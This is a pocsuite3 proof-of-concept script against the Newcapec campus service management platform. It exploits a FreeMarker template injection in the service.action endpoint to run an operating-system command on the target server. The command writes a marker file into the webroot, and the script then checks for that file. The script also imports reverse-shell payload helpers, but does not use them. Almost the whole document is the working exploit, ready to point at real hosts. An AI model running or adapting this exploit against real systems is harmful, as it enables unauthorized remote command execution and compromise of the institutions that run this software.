# _*_ coding:utf-8 _*_
# @Time : 2023/11/28 14:20
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class newcapec(POCBase):
    pocDesc = '''新开普掌上校园服务管理平台service.action远程命令执行漏洞'''
    vulID = '2023112802'
    version = '1'
    author = '公众号网络安全透视镜'
    vulDate = '2023-11-28'
    createDate = '2023-11-28'
    updateDate = '2023-11-28'
    name = '新开普掌上校园服务管理平台service.action远程命令执行漏洞'
    appName = '新开普掌上校园服务管理平台'



    def _verify(self):

        result = {}
        path = "/service_transport/service.action"
        check_path = self.url + '/security.txt'
        url = self.url + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
        }

        payload = {
            "command": "GetFZinfo",
            "UnitCode": """<#assign ex = \"freemarker.template.utility.Execute\"
          ?new()>${ex(\"cmd /c echo This website has vulnerabilities!!! >>./webapps/ROOT/security.txt\")}""",
        }
        try:
            response = requests.post(url, json=payload, verify=False, headers=headers)
        except Exception as e:
            print(e)
        finally:
            check = requests.get(check_path, headers=headers, verify=False)
            if check.status_code == 200 and 'This website has vulnerabilities' in check.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload

            return self.parse_output(result)


register_poc(newcapec)